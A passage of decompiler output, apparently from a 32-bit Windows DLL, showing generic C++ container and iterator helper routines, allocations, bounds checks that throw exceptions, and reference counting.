    v11 = sub_10051B99(*(wchar_t **)(v17[1] + 12)) <= v10 && v10 <= sub_10051B99(*(wchar_t **)(v18[1] + 12));
    LOBYTE(v28) = 7;
    sub_10012AAC(v20);
    LOBYTE(v28) = 6;
    sub_10034AAA(v15);
    LOBYTE(v28) = 4;
    sub_1003078F(v16);
    LOBYTE(v28) = 2;
    sub_1001D1FF(v19);
    LOBYTE(v28) = 1;
    sub_1000CE59(v18);
    LOBYTE(v28) = 0;
    sub_1000CE59(v17);
    return v11;
  }
}
// 1003BA79: variable 'v4' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100B6660: using guessed type wchar_t asc_100B6660[2];
// 100BBCF8: using guessed type int dword_100BBCF8;
// 1003BA03: using guessed type _DWORD var_38[2];
// 1003BA03: using guessed type _DWORD pExceptionObject;
// 1003BA03: using guessed type int var_54[3];
// 1003BA03: using guessed type int var_68[5];

//----- (1003BC84) --------------------------------------------------------
int *__stdcall sub_1003BC84(unsigned int *pExceptionObject, int *a2)
{
  unsigned int *v2; // edi
  unsigned int *v3; // esi
  _DWORD *v4; // eax
  int v5; // edi
  unsigned int *v6; // eax
  unsigned int *v7; // eax
  int *v8; // esi
  volatile LONG *v10; // [esp-4h] [ebp-28h]
  int v11; // [esp+Ch] [ebp-18h] BYREF
  volatile LONG *lpAddend; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  int v14; // [esp+20h] [ebp-4h]

  v13 = 0;
  sub_1000ABCD(&v11);
  v14 = 1;
  v2 = pExceptionObject;
  v3 = pExceptionObject + 10;
  if ( (*(unsigned __int8 (__thiscall **)(unsigned int *))(pExceptionObject[10] + 64))(pExceptionObject + 10) )
  {
LABEL_6:
    v6 = (unsigned int *)operator new(0xBCu);
    pExceptionObject = v6;
    LOBYTE(v14) = 2;
    if ( v6 )
      v7 = sub_100430C9(*((_WORD *)v2 + 28), v6, v2[16]);
    else
      v7 = 0;
    LOBYTE(v14) = 1;
    sub_100415E1(&v11, (int)v7);
    v5 = v11;
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)v11 + 52))(v11) != 3 )
    {
      sub_10016441(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
  }
  else
  {
    while ( 1 )
    {
      v4 = (_DWORD *)(*(int (__thiscall **)(unsigned int *, _DWORD))(*v3 + 44))(v3, 0);
      sub_1003F10C(&v11, v4);
      (*(void (__thiscall **)(unsigned int *, _DWORD))(*v3 + 40))(v3, 0);
      v5 = v11;
      if ( v11 )
      {
        if ( (*(int (__thiscall **)(int))(*(_DWORD *)v11 + 52))(v11) == 3 )
          break;
      }
      if ( (*(unsigned __int8 (__thiscall **)(unsigned int *))(*v3 + 64))(v3) )
      {
        v2 = pExceptionObject;
        goto LABEL_6;
      }
    }
  }
  v8 = a2;
  v10 = lpAddend;
  a2[1] = (int)lpAddend;
  *v8 = v5;
  InterlockedIncrement(v10);
  v13 = 1;
  LOBYTE(v14) = 0;
  sub_1000AC0D(&v11);
  return v8;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003BD98) --------------------------------------------------------
void __thiscall sub_1003BD98(int this, int *a2, int a3)
{
  int v3; // edi
  int v4; // ecx
  int v5; // [esp-8h] [ebp-28h] BYREF
  int v6; // [esp-4h] [ebp-24h]
  _DWORD v7[5]; // [esp+0h] [ebp-20h] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  v7[4] = v7;
  v8 = 0;
  if ( a2 )
  {
    v3 = this + 40;
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)(this + 40) + 4))(this + 40) < (unsigned int)*(unsigned __int16 *)(this + 60)
      && (*(int (__thiscall **)(int *))(*a2 + 52))(a2) == 3 )
    {
      LOBYTE(v8) = 1;
      v6 = v4;
      v5 = v4;
      v7[3] = &v5;
      sub_1003F06B(&v5, 0);
      LOBYTE(v8) = 1;
      sub_10043379(a2, v5, v6);
      (*(void (__thiscall **)(int, int **))(*(_DWORD *)v3 + 36))(v3, &a2);
      v8 = 0;
    }
  }
  v8 = -1;
  sub_1000AC0D(&a2);
}
// 1003BDD9: variable 'v4' is possibly undefined

//----- (1003BE49) --------------------------------------------------------
int __thiscall sub_1003BE49(int this, int a2)
{
  sub_1003DC19((void *)(this + 4), a2);
  return a2;
}

//----- (1003BE7F) --------------------------------------------------------
int __thiscall sub_1003BE7F(int this, int a2)
{
  sub_1003DC8C((void *)(this + 20), a2);
  return a2;
}

//----- (1003BEB5) --------------------------------------------------------
_DWORD *__thiscall sub_1003BEB5(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x20u);
  if ( v3 )
    v4 = sub_1003DE81(v3, (int)this);
  else
    v4 = 0;
  sub_10040E91(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003BF0F) --------------------------------------------------------
void *__thiscall sub_1003BF0F(_DWORD *this)
{
  void *result; // eax

  result = &loc_100756DB;
  *this = &off_100952F0;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100952F0: using guessed type int (__thiscall *off_100952F0)(void *Block, char);

//----- (1003BF39) --------------------------------------------------------
BOOL __thiscall sub_1003BF39(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1003BF59) --------------------------------------------------------
_DWORD *__thiscall sub_1003BF59(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003DF8A(this, v3, 0);
  else
    v4 = 0;
  sub_10040F22(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003BFB6) --------------------------------------------------------
_DWORD *__thiscall sub_1003BFB6(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E0FA(this, v3, 0);
  else
    v4 = 0;
  sub_10040D77(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C013) --------------------------------------------------------
_DWORD *__thiscall sub_1003C013(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003DF8A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10040F22(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C078) --------------------------------------------------------
_DWORD *__thiscall sub_1003C078(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E0FA(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10040D77(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C0DD) --------------------------------------------------------
_DWORD *__thiscall sub_1003C0DD(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003DF8A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10040F22(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C15C) --------------------------------------------------------
_DWORD *__thiscall sub_1003C15C(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E0FA(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10040D77(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C1DB) --------------------------------------------------------
void *__thiscall sub_1003C1DB(_DWORD *this)
{
  void *result; // eax

  result = &loc_10075615;
  *this = &off_1009543C;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009543C: using guessed type int (__thiscall *off_1009543C)(void *Block, char);

//----- (1003C205) --------------------------------------------------------
int *__thiscall sub_1003C205(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DC51(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003C25D: variable 'v5' is possibly undefined

//----- (1003C278) --------------------------------------------------------
int *__thiscall sub_1003C278(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DBB2(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003C2D0: variable 'v5' is possibly undefined

//----- (1003C2EB) --------------------------------------------------------
void __thiscall sub_1003C2EB(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10040F66(v2);
}

//----- (1003C329) --------------------------------------------------------
void __thiscall sub_1003C329(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10040F66(v3);
}

//----- (1003C36A) --------------------------------------------------------
void __thiscall sub_1003C36A(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10040F66(v2);
}

//----- (1003C3A8) --------------------------------------------------------
int __thiscall sub_1003C3A8(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10040DBB(v4);
  return v2;
}

//----- (1003C3EC) --------------------------------------------------------
int __thiscall sub_1003C3EC(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10040F66(v4);
  return v2;
}

//----- (1003C430) --------------------------------------------------------
void __thiscall sub_1003C430(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10040F66(v1);
}

//----- (1003C47E) --------------------------------------------------------
_DWORD *__thiscall sub_1003C47E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E26A(this, v3, 0);
  else
    v4 = 0;
  sub_10040FB9(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C4DB) --------------------------------------------------------
_DWORD *__thiscall sub_1003C4DB(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E3DA(this, v3, 0);
  else
    v4 = 0;
  sub_10040E0E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C538) --------------------------------------------------------
_DWORD *__thiscall sub_1003C538(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E26A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10040FB9(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C59D) --------------------------------------------------------
_DWORD *__thiscall sub_1003C59D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E3DA(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10040E0E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C602) --------------------------------------------------------
_DWORD *__thiscall sub_1003C602(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E26A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10040FB9(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C681) --------------------------------------------------------
_DWORD *__thiscall sub_1003C681(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E3DA(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10040E0E(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003C700) --------------------------------------------------------
void *__thiscall sub_1003C700(_DWORD *this)
{
  void *result; // eax

  result = &loc_100754E3;
  *this = &off_10095494;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095494: using guessed type int (__thiscall *off_10095494)(void *Block, char);

//----- (1003C72A) --------------------------------------------------------
int *__thiscall sub_1003C72A(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DCC4(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003C782: variable 'v5' is possibly undefined

//----- (1003C79D) --------------------------------------------------------
int *__thiscall sub_1003C79D(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DBE8(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003C7F5: variable 'v5' is possibly undefined

//----- (1003C810) --------------------------------------------------------
void __thiscall sub_1003C810(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10040FFD(v2);
}

//----- (1003C84E) --------------------------------------------------------
void __thiscall sub_1003C84E(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10040FFD(v3);
}

//----- (1003C88F) --------------------------------------------------------
void __thiscall sub_1003C88F(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10040FFD(v2);
}

//----- (1003C8CD) --------------------------------------------------------
int __thiscall sub_1003C8CD(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10040E52(v4);
  return v2;
}

//----- (1003C911) --------------------------------------------------------
int __thiscall sub_1003C911(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10040FFD(v4);
  return v2;
}

//----- (1003C955) --------------------------------------------------------
void __thiscall sub_1003C955(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10040FFD(v1);
}

//----- (1003C9A3) --------------------------------------------------------
_DWORD *__thiscall sub_1003C9A3(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E54A(this, v3, 0);
  else
    v4 = 0;
  sub_10041050(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CA00) --------------------------------------------------------
_DWORD *__thiscall sub_1003CA00(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E6BA(this, v3, 0);
  else
    v4 = 0;
  sub_100410E7(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CA5D) --------------------------------------------------------
_DWORD *__thiscall sub_1003CA5D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E54A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10041050(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CAC2) --------------------------------------------------------
_DWORD *__thiscall sub_1003CAC2(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E6BA(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100410E7(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CB27) --------------------------------------------------------
_DWORD *__thiscall sub_1003CB27(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E54A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10041050(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CBA6) --------------------------------------------------------
_DWORD *__thiscall sub_1003CBA6(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E6BA(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100410E7(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CC25) --------------------------------------------------------
void *__thiscall sub_1003CC25(_DWORD *this)
{
  void *result; // eax

  result = &loc_100753B1;
  *this = &off_1009554C;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009554C: using guessed type int (__thiscall *off_1009554C)(void *Block, char);

//----- (1003CC4F) --------------------------------------------------------
int *__thiscall sub_1003CC4F(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DD04(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003CCA7: variable 'v5' is possibly undefined

//----- (1003CCC2) --------------------------------------------------------
int *__thiscall sub_1003CCC2(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DD44(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003CD1A: variable 'v5' is possibly undefined

//----- (1003CD35) --------------------------------------------------------
void __thiscall sub_1003CD35(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10041094(v2);
}

//----- (1003CD73) --------------------------------------------------------
void __thiscall sub_1003CD73(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10041094(v3);
}

//----- (1003CDB4) --------------------------------------------------------
void __thiscall sub_1003CDB4(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10041094(v2);
}

//----- (1003CDF2) --------------------------------------------------------
int __thiscall sub_1003CDF2(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1004112B(v4);
  return v2;
}

//----- (1003CE36) --------------------------------------------------------
int __thiscall sub_1003CE36(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10041094(v4);
  return v2;
}

//----- (1003CE7A) --------------------------------------------------------
void __thiscall sub_1003CE7A(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
